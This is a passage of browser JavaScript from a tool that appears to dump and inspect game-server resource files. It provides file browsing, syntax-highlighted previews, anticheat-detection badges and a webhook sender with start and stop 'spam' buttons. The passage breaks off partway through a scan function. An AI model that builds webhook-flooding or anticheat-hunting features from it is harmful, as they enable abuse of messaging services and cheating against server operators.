    const addWebhookBtn = document.getElementById('add-webhook-btn');
    const manualWebhookInput = document.getElementById('manual-webhook-url');

    const coordinateSearch = document.getElementById('coordinate-search');
    const coordinateTypeFilter = document.getElementById('coordinate-type-filter');
    
    if (sendBtn) {
        sendBtn.addEventListener('click', sendWebhookOnce);
    }
    
    if (clearBtn) {
        clearBtn.addEventListener('click', clearWebhookForm);
    }
    
    if (startSpamBtn) {
        startSpamBtn.addEventListener('click', startWebhookSpam);
    }
    
    if (stopSpamBtn) {
        stopSpamBtn.addEventListener('click', stopWebhookSpam);
    }

    if (selectAllBtn) {
        selectAllBtn.addEventListener('click', selectAllWebhooks);
    }

    if (clearSelectionBtn) {
        clearSelectionBtn.addEventListener('click', clearWebhookSelection);
    }

    if (addWebhookBtn) {
        addWebhookBtn.addEventListener('click', addManualWebhook);
    }

    if (manualWebhookInput) {
        manualWebhookInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                addManualWebhook();
            }
        });
    }

    if (coordinateSearch) {
        coordinateSearch.addEventListener('input', handleCoordinateSearch);
    }

    if (coordinateTypeFilter) {
        coordinateTypeFilter.addEventListener('change', handleCoordinateTypeFilter);
    }

    const messageContent = document.getElementById('message-content');
    const overrideUsername = document.getElementById('override-username');
    const avatarUrl = document.getElementById('avatar-url');
    const embedCheckbox = document.getElementById('embed-checkbox');
    const embedTitle = document.getElementById('embed-title');
    const embedDescription = document.getElementById('embed-description');
    const embedColor = document.getElementById('embed-color');
    
    if (messageContent) {
        messageContent.addEventListener('input', updatePreview);
    }
    
    if (overrideUsername) {
        overrideUsername.addEventListener('input', updatePreview);
    }
    
    if (avatarUrl) {
        avatarUrl.addEventListener('input', updatePreview);
    }
    
    if (embedCheckbox) {
        embedCheckbox.addEventListener('change', () => {
            const embedOptions = document.getElementById('embed-options');
            if (embedOptions) {
                embedOptions.style.display = embedCheckbox.checked ? 'block' : 'none';
            }
            updatePreview();
        });

        const embedOptions = document.getElementById('embed-options');
        if (embedOptions) {
            embedOptions.style.display = embedCheckbox.checked ? 'block' : 'none';
        }
    }
    
    if (embedTitle) {
        embedTitle.addEventListener('input', updatePreview);
    }
    
    if (embedDescription) {
        embedDescription.addEventListener('input', updatePreview);
    }
    
    if (embedColor) {
        embedColor.addEventListener('input', () => {
            const colorValue = embedColor.value;
            const colorSwatch = document.getElementById('color-swatch');
            if (colorSwatch) {
                const hexValue = colorValue.startsWith('#') ? colorValue : '#' + colorValue;
                colorSwatch.style.backgroundColor = hexValue;
            }
            updatePreview();
        });
    }
    
    const embedAuthorName = document.getElementById('embed-author-name');
    const embedAuthorIcon = document.getElementById('embed-author-icon');
    const embedFooterText = document.getElementById('embed-footer-text');
    const embedFooterIcon = document.getElementById('embed-footer-icon');
    const embedThumbnailUrl = document.getElementById('embed-thumbnail-url');
    const embedImageUrl = document.getElementById('embed-image-url');
    
    if (embedAuthorName) {
        embedAuthorName.addEventListener('input', updatePreview);
    }
    
    if (embedAuthorIcon) {
        embedAuthorIcon.addEventListener('input', updatePreview);
    }
    
    if (embedFooterText) {
        embedFooterText.addEventListener('input', updatePreview);
    }
    
    if (embedFooterIcon) {
        embedFooterIcon.addEventListener('input', updatePreview);
    }
    
    if (embedThumbnailUrl) {
        embedThumbnailUrl.addEventListener('input', updatePreview);
    }
    
    if (embedImageUrl) {
        embedImageUrl.addEventListener('input', updatePreview);
    }
    
    updatePreview();
    
    const addWebhookUrlBtn = document.getElementById('add-webhook-url-btn');
    if (addWebhookUrlBtn) {
        addWebhookUrlBtn.addEventListener('click', () => {
            const webhookUrlsList = document.getElementById('webhook-urls-list');
            const template = document.getElementById('webhook-url-item-template');
            if (webhookUrlsList && template) {
                const newItem = template.cloneNode(true);
                newItem.style.display = 'flex';
                newItem.querySelector('.webhook-url-input').value = '';
                
                const removeBtn = newItem.querySelector('.remove-webhook-url-btn');
                if (removeBtn) {
                    removeBtn.addEventListener('click', () => {
                        newItem.remove();
                    });
                }
                
                webhookUrlsList.appendChild(newItem);
            }
        });
    }

    if (addWebhookUrlBtn) {
        addWebhookUrlBtn.click();
    }
}

function checkWebCompatibility() {
    try {

        const isWebkitSupported = 'webkitdirectory' in HTMLInputElement.prototype;
        
        if (!isWebkitSupported) {

            setTimeout(() => {
                showNotification('Web Mode: Use the Browse button to select individual files or drag & drop files directly', 'info');
            }, 2000);
        }

        if (!navigator.clipboard || !window.isSecureContext) {
            console.log('Clipboard API not available - using fallback methods');
        }
        
    } catch (error) {
        console.error('Error checking web compatibility:', error);
    }
}

function browseServerDirectory() {
    try {

        const isWebkitSupported = 'webkitdirectory' in HTMLInputElement.prototype;
        
        if (isWebkitSupported) {

            const input = document.createElement('input');
            input.type = 'file';
            input.webkitdirectory = true;
            input.multiple = true;
            
            input.addEventListener('change', (event) => {
                try {
                    const files = event.target.files;
                    if (files.length > 0) {
                        const directoryPath = files[0].webkitRelativePath.split('/')[0];
                        serverDirectoryInput.value = directoryPath;
                        appState.serverDirectory = directoryPath;
                        appState.selectedFiles = Array.from(files);
                        
                        updateResourceExplorer(files);
                        showNotification(`Selected directory: ${directoryPath} (${files.length} files)`, 'success');
                    }
                } catch (error) {
                    console.error('Error processing directory:', error);
                    showNotification('Error processing directory', 'error');
                }
            });
            
            input.click();
        } else {

            showWebFileSelector();
        }
    } catch (error) {
        console.error('Error creating file input:', error);

        showWebFileSelector();
    }
}

function showWebFileSelector() {
    try {

        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        const modalContent = document.createElement('div');
        modalContent.style.cssText = `
            background: #2a2a2a;
            padding: 30px;
            border-radius: 12px;
            border: 2px solid #ededed;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        `;

        modalContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <h3 style="color: #ffffff; margin: 0 0 15px 0; display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-upload"></i>
                    Web File Upload
                </h3>
                <p style="color: #9a9aa8; margin: 0; line-height: 1.5;">
                    For web compatibility, please select individual files or use the drag & drop area below. 
                    You can select multiple files by holding Ctrl/Cmd while clicking.
                </p>
            </div>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #9a9aa8; display: block; margin-bottom: 8px; font-weight: 600;">
                    SELECT FILES:
                </label>
                <input type="file" id="web-file-input" multiple accept=".lua,.js,.json,.cfg,.txt,.xml,.html,.css,.php,.py,.md" style="
                    width: 100%;
                    padding: 12px;
                    background: #1a1a1a;
                    border: 2px solid #ededed;
                    border-radius: 6px;
                    color: #ffffff;
                    font-size: 14px;
                    margin-bottom: 15px;
                ">
            </div>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #9a9aa8; display: block; margin-bottom: 8px; font-weight: 600;">
                    OR DRAG & DROP FILES HERE:
                </label>
                <div id="drop-zone" style="
                    border: 2px dashed #ededed;
                    border-radius: 8px;
                    padding: 40px;
                    text-align: center;
                    background: #1a1a1a;
                    transition: all 0.3s ease;
                    cursor: pointer;
                ">
                    <i class="fas fa-cloud-upload-alt" style="font-size: 48px; color: #ededed; margin-bottom: 15px; display: block;"></i>
                    <p style="color: #9a9aa8; margin: 0; font-size: 16px;">Drop files here or click to browse</p>
                    <p style="color: #9a9aa8; margin: 10px 0 0 0; font-size: 12px;">Supports: .lua, .js, .json, .cfg, .txt, .xml, .html, .css, .php, .py, .md</p>
                </div>
            </div>
            
            <div style="display: flex; gap: 10px; justify-content: flex-end;">
                <button id="cancel-web-upload" style="
                    padding: 10px 20px;
                    background: #6c757d;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    font-size: 14px;
                ">Cancel</button>
                <button id="process-web-files" style="
                    padding: 10px 20px;
                    background: #ededed;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 600;
                ">Process Files</button>
            </div>
        `;

        modal.appendChild(modalContent);
        document.body.appendChild(modal);

        const fileInput = modalContent.querySelector('#web-file-input');
        const dropZone = modalContent.querySelector('#drop-zone');
        const processBtn = modalContent.querySelector('#process-web-files');
        const cancelBtn = modalContent.querySelector('#cancel-web-upload');
        
        let selectedFiles = [];

        fileInput.addEventListener('change', (e) => {
            selectedFiles = Array.from(e.target.files);
            updateFileList(selectedFiles);

            if (selectedFiles.length > 0) {
                setTimeout(() => processFiles(), 100); // Small delay to update UI first
            }
        });

        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.style.borderColor = '#ededed';
            dropZone.style.background = 'rgba(255, 255, 255, 0.1)';
        });

        dropZone.addEventListener('dragleave', (e) => {
            e.preventDefault();
            dropZone.style.borderColor = '#ededed';
            dropZone.style.background = '#1a1a1a';
        });

        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.style.borderColor = '#ededed';
            dropZone.style.background = '#1a1a1a';
            
            const files = Array.from(e.dataTransfer.files);
            selectedFiles = files.filter(file => {
                const ext = file.name.toLowerCase().split('.').pop();
                return ['lua', 'js', 'json', 'cfg', 'txt', 'xml', 'html', 'css', 'php', 'py', 'md'].includes(ext);
            });
            
            updateFileList(selectedFiles);

            if (selectedFiles.length > 0) {
                setTimeout(() => processFiles(), 100); // Small delay to update UI first
            }
        });

        dropZone.addEventListener('click', () => {
            fileInput.click();
        });

        const processFiles = () => {
            if (selectedFiles.length === 0) {
                return;
            }

            const virtualFiles = selectedFiles.map(file => {

                file.webkitRelativePath = `web_upload/${file.name}`;
                return file;
            });
            
            appState.serverDirectory = 'web_upload';
            appState.selectedFiles = virtualFiles;
            serverDirectoryInput.value = 'web_upload';
            
            updateResourceExplorer(virtualFiles);
            showNotification(`Processed ${selectedFiles.length} files from web upload`, 'success');

            document.body.removeChild(modal);
        };

        processBtn.addEventListener('click', processFiles);

        cancelBtn.addEventListener('click', () => {
            document.body.removeChild(modal);
        });

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                document.body.removeChild(modal);
            }
        });

        function updateFileList(files) {
            const dropZone = modalContent.querySelector('#drop-zone');
            if (files.length > 0) {
                dropZone.innerHTML = `
                    <i class="fas fa-check-circle" style="font-size: 48px; color: #34d399; margin-bottom: 15px; display: block;"></i>
                    <p style="color: #ffffff; margin: 0; font-size: 16px; font-weight: 600;">${files.length} file(s) selected</p>
                    <p style="color: #9a9aa8; margin: 10px 0 0 0; font-size: 12px;">Click to change selection</p>
                `;
            } else {
                dropZone.innerHTML = `
                    <i class="fas fa-cloud-upload-alt" style="font-size: 48px; color: #ededed; margin-bottom: 15px; display: block;"></i>
                    <p style="color: #9a9aa8; margin: 0; font-size: 16px;">Drop files here or click to browse</p>
                    <p style="color: #9a9aa8; margin: 10px 0 0 0; font-size: 12px;">Supports: .lua, .js, .json, .cfg, .txt, .xml, .html, .css, .php, .py, .md</p>
                `;
            }
        }

    } catch (error) {
        console.error('Error showing web file selector:', error);
        showNotification('Error creating file selector', 'error');
    }
}

function updateResourceExplorer(files, searchTerm = '') {
    try {
        const resourceTree = document.getElementById('resource-tree');
        if (!resourceTree) return;
        
        resourceTree.innerHTML = '';
        
        if (!files || files.length === 0) {
            if (searchTerm) {
                resourceTree.innerHTML = `
                    <div class="resource-item" style="text-align: center; color: #9a9aa8; font-style: italic; padding: 20px;">
                        <i class="fas fa-search" style="margin-right: 8px;"></i>
                        No resources found matching "${searchTerm}"
                    </div>
                `;
            } else {
                resourceTree.innerHTML = `
                    <div class="resource-item" style="text-align: center; color: #9a9aa8; font-style: italic; padding: 20px;">
                        <i class="fas fa-folder" style="margin-right: 8px;"></i>
                        Select a server directory to explore
                    </div>
                `;
            }
            return;
        }

        const fileTree = {};

        for (let file of files) {

            const relativePath = file.webkitRelativePath || `web_upload/${file.name}`;
            const pathParts = relativePath.split('/');
            let currentLevel = fileTree;

            for (let i = 0; i < pathParts.length - 1; i++) {
                const folderName = pathParts[i];
                if (!currentLevel[folderName]) {
                    currentLevel[folderName] = { type: 'folder', children: {}, files: [] };
                }
                currentLevel = currentLevel[folderName].children;
            }

            const fileName = pathParts[pathParts.length - 1];
            currentLevel[fileName] = { type: 'file', file: file };
        }

        renderFolderTree(resourceTree, fileTree, '', searchTerm);
        
    } catch (error) {
        console.error('Error updating resource explorer:', error);
    }
}

function updateResourceExplorerWithAnticheats() {
    try {

        const anticheats = appState.scanResults.anticheats || [];

        const anticheatMap = new Map();
        anticheats.forEach(ac => {
            const key = ac.folder || ac.resource;
            if (key) {
                anticheatMap.set(key.toLowerCase(), ac.name);
            }
        });

        const folderElements = document.querySelectorAll('.resource-folder .folder-header');
        
        folderElements.forEach(folderElement => {
            const resourceNameSpan = folderElement.querySelector('span:first-of-type');
            if (resourceNameSpan) {
                const resourceName = resourceNameSpan.textContent.trim();
                const resourceNameLower = resourceName.toLowerCase();

                if (anticheatMap.has(resourceNameLower)) {
                    const anticheatName = anticheatMap.get(resourceNameLower);

                    const existingAC = folderElement.querySelector('.ac-indicator');
                    if (existingAC) {
                        existingAC.remove();
                    }

                    const acIndicator = document.createElement('span');
                    acIndicator.className = 'ac-indicator';
                    acIndicator.style.cssText = `
                        background: #e05572;
                        color: white;
                        padding: 2px 6px;
                        border-radius: 3px;
                        font-size: 10px;
                        font-weight: bold;
                        margin-left: 8px;
                        cursor: pointer;
                        transition: background-color 0.2s;
                    `;
                    acIndicator.textContent = `AC: ${anticheatName}`;
                    acIndicator.title = `${anticheatName} found in ${resourceName}`;

                    acIndicator.addEventListener('mouseenter', () => {
                        acIndicator.style.backgroundColor = '#d1506a';
                    });
                    
                    acIndicator.addEventListener('mouseleave', () => {
                        acIndicator.style.backgroundColor = '#e05572';
                    });

                    acIndicator.addEventListener('click', (e) => {
                        e.stopPropagation();
                        showNotification(`Anticheat detected: ${anticheatName}`, 'warning');
                    });

                    resourceNameSpan.parentNode.insertBefore(acIndicator, resourceNameSpan.nextSibling);
                }
            }
        });
        
    } catch (error) {
        console.error('Error updating resource explorer with anticheats:', error);
    }
}


function renderFolderTree(container, tree, path, searchTerm = '') {
    try {
        Object.keys(tree).forEach(name => {
            const item = tree[name];
            const fullPath = path ? `${path}/${name}` : name;
            
            if (item.type === 'folder') {

                const fileCount = countFilesInFolder(item);

                if (searchTerm && fileCount === 0) {
                    return;
                }

                const folderElement = document.createElement('div');
                folderElement.className = 'resource-folder';
                folderElement.style.cssText = `
                    margin: 2px 0;
                    user-select: none;
                `;
                
                folderElement.innerHTML = `
                    <div class="folder-header" style="display: flex; align-items: center; padding: 6px 8px; cursor: pointer; border-radius: 4px; transition: background-color 0.2s;">
                        <i class="fas fa-chevron-right folder-icon" style="margin-right: 8px; font-size: 12px; transition: transform 0.2s; color: #9a9aa8; width: 12px; text-align: center;"></i>
                        <i class="fas fa-folder" style="margin-right: 8px; color: #e3b341; font-size: 14px;"></i>
                        <span style="flex: 1; color: #ffffff; font-weight: 500;">${name}</span>
                        <span style="font-size: 11px; color: #9a9aa8; margin-left: 8px;">${fileCount} files</span>
                    </div>
                    <div class="folder-content" style="display: none; margin-left: 20px; border-left: 1px solid rgba(139, 157, 195, 0.2); padding-left: 10px;">
                    </div>
                `;

                const folderHeader = folderElement.querySelector('.folder-header');
                const folderContent = folderElement.querySelector('.folder-content');
                const folderIcon = folderElement.querySelector('.folder-icon');
                
                folderHeader.addEventListener('click', () => {
                    const isExpanded = folderContent.style.display !== 'none';
                    
                    if (isExpanded) {
                        folderContent.style.display = 'none';
                        folderIcon.style.transform = 'rotate(0deg)';
                        folderHeader.style.backgroundColor = 'transparent';
                    } else {
                        folderContent.style.display = 'block';
                        folderIcon.style.transform = 'rotate(90deg)';
                        folderHeader.style.backgroundColor = 'rgba(139, 157, 195, 0.1)';

                        if (folderContent.children.length === 0) {
                            renderFolderTree(folderContent, item.children, fullPath, searchTerm);
                        }
                    }
                });


                if (searchTerm && path === '') {

                    folderContent.style.display = 'block';
                    folderIcon.style.transform = 'rotate(90deg)';
                    folderHeader.style.backgroundColor = 'rgba(139, 157, 195, 0.1)';

                    if (folderContent.children.length === 0) {
                        renderFolderTree(folderContent, item.children, fullPath, searchTerm);
                    }
                }

                folderHeader.addEventListener('mouseenter', () => {
                    if (folderContent.style.display === 'none') {
                        folderHeader.style.backgroundColor = 'rgba(139, 157, 195, 0.05)';
                    }
                });
                
                folderHeader.addEventListener('mouseleave', () => {
                    if (folderContent.style.display === 'none') {
                        folderHeader.style.backgroundColor = 'transparent';
                    }
                });
                
                container.appendChild(folderElement);
                
            } else if (item.type === 'file') {

                if (searchTerm) {
                    const fileName = item.file.name.toLowerCase();
                    const filePath = (item.file.webkitRelativePath || `web_upload/${item.file.name}`).toLowerCase();
                    if (!fileName.includes(searchTerm) && !filePath.includes(searchTerm)) {
                        return;
                    }
                }

                const fileElement = document.createElement('div');
                fileElement.className = 'resource-file';
                fileElement.style.cssText = `
                    display: flex;
                    align-items: center;
                    padding: 4px 8px;
                    margin: 2px 0;
                    cursor: pointer;
                    border-radius: 4px;
                    transition: background-color 0.2s;
                    margin-left: 20px;
                    font-size: 13px;
                `;

                const fileIcon = getFileIcon(name);
                
                fileElement.innerHTML = `
                    <i class="${fileIcon}" style="margin-right: 8px; color: #ededed; font-size: 12px; width: 12px; text-align: center;"></i>
                    <span style="flex: 1; color: #ffffff; font-size: 13px;">${name}</span>
                    <span style="font-size: 11px; color: #9a9aa8;">${formatFileSize(item.file.size)}</span>
                    <button class="view-file-btn" style="margin-left: 8px; padding: 2px 6px; background: #ededed; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 10px; opacity: 0; transition: opacity 0.2s;">
                        <i class="fas fa-eye"></i>
                    </button>
                `;

                fileElement.addEventListener('click', () => {
                    viewFile(item.file);
                });

                fileElement.addEventListener('mouseenter', () => {
                    const viewBtn = fileElement.querySelector('.view-file-btn');
                    if (viewBtn) viewBtn.style.opacity = '1';
                });
                
                fileElement.addEventListener('mouseleave', () => {
                    const viewBtn = fileElement.querySelector('.view-file-btn');
                    if (viewBtn) viewBtn.style.opacity = '0';
                });

                fileElement.addEventListener('mouseenter', () => {
                    fileElement.style.backgroundColor = 'rgba(139, 157, 195, 0.1)';
                });
                
                fileElement.addEventListener('mouseleave', () => {
                    fileElement.style.backgroundColor = 'transparent';
                });
                
                container.appendChild(fileElement);
            }
        });
    } catch (error) {
        console.error('Error rendering folder tree:', error);
    }
}

function countFilesInFolder(folder) {
    try {
        let count = 0;

        Object.keys(folder.children).forEach(name => {
            const item = folder.children[name];
            if (item.type === 'file') {
                count++;
            } else if (item.type === 'folder') {
                count += countFilesInFolder(item);
            }
        });
        
        return count;
    } catch (error) {
        console.error('Error counting files in folder:', error);
        return 0;
    }
}

function getFileIcon(fileName) {
    try {
        const extension = fileName.toLowerCase().substring(fileName.lastIndexOf('.'));
        
        switch (extension) {
            case '.lua':
                return 'fas fa-code';
            case '.js':
                return 'fab fa-js-square';
            case '.json':
                return 'fas fa-file-code';
            case '.html':
                return 'fab fa-html5';
            case '.css':
                return 'fab fa-css3-alt';
            case '.xml':
                return 'fas fa-file-code';
            case '.txt':
                return 'fas fa-file-alt';
            case '.md':
                return 'fas fa-file-alt';
            case '.png':
            case '.jpg':
            case '.jpeg':
            case '.gif':
            case '.webp':
            case '.svg':
                return 'fas fa-image';
            case '.cfg':
                return 'fas fa-cog';
            case '.php':
                return 'fab fa-php';
            case '.py':
                return 'fab fa-python';
            default:
                return 'fas fa-file';
        }
    } catch (error) {
        console.error('Error getting file icon:', error);
        return 'fas fa-file';
    }
}

function formatFileSize(bytes) {
    try {
        if (bytes === 0) return '0 B';
        
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        
        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
    } catch (error) {
        console.error('Error formatting file size:', error);
        return '0 B';
    }
}

function viewFile(file) {
    const fileViewerModal = document.getElementById('file-viewer-modal');
    const fileViewerName = document.getElementById('file-viewer-name');
    const fileViewerText = document.getElementById('file-viewer-text');
    const fileViewerClose = document.getElementById('file-viewer-close');
    const fileViewerOverlay = document.getElementById('file-viewer-overlay');

    fileViewerModal.style.display = 'flex';

    fileViewerName.textContent = `File Preview: ${file.name}`;

    fileViewerText.innerHTML = '<span style="color: #9a9aa8;">Loading file content...</span>';

    const reader = new FileReader();
    reader.onload = function(e) {
        try {
            const content = e.target.result;
            if (isTextFile(file.name)) {

                const maxLength = 100000; // 100KB limit
                let displayContent = content;
                
                if (content.length > maxLength) {
                    displayContent = content.substring(0, maxLength) + '\n\n... (File truncated - too large to display completely)';
                }

                let highlightedContent = applySyntaxHighlighting(displayContent, file.name);

                if (file.name.endsWith('.lua')) {

                    if (highlightedContent.includes('&lt;span')) {

                        highlightedContent = highlightedContent
                            .replace(/&lt;span/g, '<span')
                            .replace(/&lt;\/span&gt;/g, '</span>')
                            .replace(/&quot;/g, '"')
                            .replace(/&#039;/g, "'");
                    }
                }

                fileViewerText.innerHTML = highlightedContent;


                setTimeout(() => {
                    setupFileViewerSearch(fileViewerModal);
                }, 10);
            } else {
                fileViewerText.innerHTML = `<span style="color: #9a9aa8;">Binary file - content not displayed

File type: ${file.type}
Size: ${(file.size / 1024).toFixed(2)} KB</span>`;
            }
        } catch (error) {
            fileViewerText.innerHTML = `<span style="color: #e05572;">Error reading file content: ${error.message}</span>`;
            console.error('Error reading file:', error);
        }
    };
    
    reader.onerror = function() {
        fileViewerText.innerHTML = '<span style="color: #e05572;">Error reading file. Please try again.</span>';
    };

    if (isTextFile(file.name)) {
        reader.readAsText(file);
    } else {
        fileViewerText.innerHTML = `<span style="color: #9a9aa8;">Binary file - content not displayed

File type: ${file.type}
Size: ${(file.size / 1024).toFixed(2)} KB</span>`;
    }

    const closeFileViewer = () => {
        fileViewerModal.style.display = 'none';
    };
    
    fileViewerClose.onclick = closeFileViewer;
    fileViewerOverlay.onclick = closeFileViewer;

    const handleEscape = (e) => {
        if (e.key === 'Escape') {
            closeFileViewer();
            document.removeEventListener('keydown', handleEscape);
        }
    };
    document.addEventListener('keydown', handleEscape);

    showNotification('File opened: ' + file.name, 'info');
}

function applySyntaxHighlighting(content, fileName) {
    try {
        const extension = fileName.toLowerCase().substring(fileName.lastIndexOf('.'));
        
        switch (extension) {
            case '.xml':
            case '.meta':
                return highlightXML(content);
            case '.lua':
                return highlightLua(content);
            case '.js':
                return highlightJavaScript(content);
            case '.json':
                return highlightJSON(content);
            case '.html':
                return highlightHTML(content);
            case '.css':
                return highlightCSS(content);
            case '.php':
                return highlightPHP(content);
            case '.py':
                return highlightPython(content);
            default:
                return escapeHtml(content);
        }
    } catch (error) {
        console.error('Error applying syntax highlighting:', error);
        return escapeHtml(content);
    }
}

function highlightXML(content) {
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/(".*?")/g, '<span class="xml-attr">$1</span>')
        .replace(/(&lt;\/?[a-zA-Z][a-zA-Z0-9]*)/g, '<span class="xml-tag">$1</span>')
        .replace(/(&gt;)/g, '<span class="xml-tag">$1</span>')
        .replace(/(&lt;!--.*?--&gt;)/g, '<span class="xml-comment">$1</span>')
        .replace(/(&gt;)([^&]*?)(&lt;)/g, function(match, open, content, close) {
            return open + '<span class="xml-value">' + content + '</span>' + close;
        });
}

function highlightLua(content) {


    let html = content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    
    const keywords = ['function', 'end', 'if', 'then', 'else', 'elseif', 'for', 'while', 'do', 'repeat', 'until', 'break', 'return', 'local', 'nil', 'true', 'false', 'and', 'or', 'not', 'in'];
    const keywordPattern = '\\b(' + keywords.join('|') + ')\\b';



    html = html.replace(/(&quot;)((?:(?!&quot;)[^&]|&(?!quot;))*)&quot;/g, '<span class="lua-string">$1$2$1</span>');

    html = html.replace(/(&#039;)((?:(?!&#039;)[^&]|&(?!#039;))*)&#039;/g, '<span class="lua-string">$1$2$1</span>');

    html = html.replace(/(--[^\n]*)/g, '<span class="lua-comment">$1</span>');

    html = html.replace(/\b(\d+\.?\d*)\b/g, '<span class="lua-number">$1</span>');


    const keywordRegex = new RegExp(keywordPattern, 'g');
    html = html.replace(keywordRegex, function(match, keyword, offset, string) {

        const before = string.substring(0, offset);
        const openCount = (before.match(/<span[^>]*>/g) || []).length;
        const closeCount = (before.match(/<\/span>/g) || []).length;
        if (openCount > closeCount) {
            return match; // Inside a span, don't highlight
        }

        return '<span class="lua-keyword">' + keyword + '</span>';
    });
    
    return html;
}

function highlightJavaScript(content) {
    const keywords = ['function', 'var', 'let', 'const', 'if', 'else', 'for', 'while', 'do', 'switch', 'case', 'break', 'continue', 'return', 'try', 'catch', 'finally', 'throw', 'new', 'delete', 'typeof', 'instanceof', 'in', 'of', 'class', 'extends', 'super', 'import', 'export', 'default', 'async', 'await', 'true', 'false', 'null', 'undefined'];
    const keywordRegex = new RegExp('\\b(' + keywords.join('|') + ')\\b', 'g');
    
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(keywordRegex, '<span class="js-keyword">$1</span>')
        .replace(/(\/\/.*)/g, '<span class="js-comment">$1</span>')
        .replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="js-comment">$1</span>')
        .replace(/(\d+\.?\d*)/g, '<span class="js-number">$1</span>')
        .replace(/(["'`])((?:\\.|(?!\1)[^\\])*?)\1/g, '<span class="js-string">$1$2$1</span>');
}

function highlightJSON(content) {
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, '<span class="js-string">$1$2$1</span>')
        .replace(/(\d+\.?\d*)/g, '<span class="js-number">$1</span>')
        .replace(/\b(true|false|null)\b/g, '<span class="js-keyword">$1</span>');
}

function highlightHTML(content) {
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/(&lt;\/?[a-zA-Z][a-zA-Z0-9]*)/g, '<span class="xml-tag">$1</span>')
        .replace(/(&gt;)/g, '<span class="xml-tag">$1</span>')
        .replace(/(".*?")/g, '<span class="xml-attr">$1</span>')
        .replace(/(&lt;!--.*?--&gt;)/g, '<span class="xml-comment">$1</span>');
}

function highlightCSS(content) {
    const keywords = ['@media', '@import', '@font-face', '@keyframes', '@supports', '!important'];
    const keywordRegex = new RegExp('\\b(' + keywords.join('|') + ')\\b', 'g');
    
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(keywordRegex, '<span class="js-keyword">$1</span>')
        .replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="js-comment">$1</span>')
        .replace(/(\d+\.?\d*)/g, '<span class="js-number">$1</span>')
        .replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, '<span class="js-string">$1$2$1</span>');
}

function highlightPHP(content) {
    const keywords = ['function', 'class', 'public', 'private', 'protected', 'static', 'const', 'if', 'else', 'elseif', 'for', 'foreach', 'while', 'do', 'switch', 'case', 'break', 'continue', 'return', 'try', 'catch', 'finally', 'throw', 'new', 'clone', 'var', 'global', 'isset', 'unset', 'empty', 'die', 'exit', 'true', 'false', 'null', 'array', 'string', 'int', 'float', 'bool', 'object', 'mixed', 'void'];
    const keywordRegex = new RegExp('\\b(' + keywords.join('|') + ')\\b', 'g');
    
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/(&lt;\?php|\?&gt;)/g, '<span class="js-keyword">$1</span>')
        .replace(keywordRegex, '<span class="js-keyword">$1</span>')
        .replace(/(\/\/.*)/g, '<span class="js-comment">$1</span>')
        .replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="js-comment">$1</span>')
        .replace(/(\d+\.?\d*)/g, '<span class="js-number">$1</span>')
        .replace(/(["'])((?:\\.|(?!\1)[^\\])*?)\1/g, '<span class="js-string">$1$2$1</span>');
}

function highlightPython(content) {
    const keywords = ['def', 'class', 'if', 'elif', 'else', 'for', 'while', 'try', 'except', 'finally', 'with', 'as', 'import', 'from', 'return', 'yield', 'break', 'continue', 'pass', 'raise', 'assert', 'True', 'False', 'None', 'and', 'or', 'not', 'in', 'is', 'lambda', 'global', 'nonlocal'];
    const keywordRegex = new RegExp('\\b(' + keywords.join('|') + ')\\b', 'g');
    
    return content
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(keywordRegex, '<span class="js-keyword">$1</span>')
        .replace(/(#.*)/g, '<span class="js-comment">$1</span>')
        .replace(/(\d+\.?\d*)/g, '<span class="js-number">$1</span>')
        .replace(/(["'`])((?:\\.|(?!\1)[^\\])*?)\1/g, '<span class="js-string">$1$2$1</span>');
}

function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function performDeepScan() {
    if (!appState.serverDirectory || appState.selectedFiles.length === 0) {
        showNotification('Please select a server directory first', 'error');
        return;
    }
    
    showDeepScanNotification();
    scanAllFiles();
}

function scanAllFiles() {
    try {
        finishScanCalled = false;

        const anticheatStatus = document.getElementById('anticheat-status');
        if (anticheatStatus) {
            anticheatStatus.textContent = 'Anticheat: Scanning...';
        }
        
        const files = appState.selectedFiles;
        let processedFiles = 0;
        const totalFiles = files.length;
        let scanFinished = false;

